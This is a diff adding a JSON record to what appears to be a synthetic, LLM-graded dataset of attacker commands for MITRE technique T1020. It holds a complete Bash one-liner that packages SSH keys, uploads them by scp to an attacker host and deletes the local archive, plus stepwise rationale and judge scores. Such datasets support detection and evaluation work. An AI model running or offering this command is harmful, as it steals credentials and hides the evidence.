@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); tar -czf /tmp/sshkeys_${ts}.tgz /root/.ssh $(find /home -maxdepth 2 -type d -name .ssh -print) >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/sshkeys_${ts}.tgz attacker@203.0.113.7:/var/tmp/.cache/.sshkeys/ >/dev/null 2>&1 && rm -f /tmp/sshkeys_${ts}.tgz",
+  "explanation": "Collects root and user SSH keys into a single archive and quietly exfiltrates them via scp over a non-standard SSH port to avoid interactive prompts.",
+  "rationale_steps": [
+    "Enumerate and package SSH key directories for root and users to a single archive.",
+    "Use scp with an identity file for automated, passwordless transfer.",
+    "Disable host key checking and suppress output to avoid terminal noise and prompts.",
+    "Remove the temporary archive after successful upload to reduce local evidence."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-cc327a6d",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed Bash with valid substitutions, flags, redirections, and operator chaining.",
+        "semantic_score": 3,
+        "semantic_justification": "While tar packaging and scp exfiltration align with T1020, reliance on /root/.ssh and /root/.ssh/id_rsa with 'Privilege: None' will typically prevent access to root files and undermine the stated intent.",
+        "combined_score": 4.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T02:00:29.982662Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quoting, proper use of command separators (&&), valid flag formats for tar, scp, find, and date, and correct variable interpolation throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements automated exfiltration (T1020) by collecting SSH keys from root and all home directories into a timestamped compressed archive, silently transferring it via scp over a non-standard port (2222) to an external attacker-controlled host with host key checking disabled, then cleaning up the local artifact — fully consistent with the described technique.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-18T22:18:49.217554Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct bash syntax for variable assignment, command substitution, logical operators, and standard flags for tar and scp.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly executes the intended logic of packaging sensitive files and exfiltrating them via a non-interactive, encrypted channel with appropriate cleanup, aligning exactly with the T1020 technique.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:18:54.439048Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
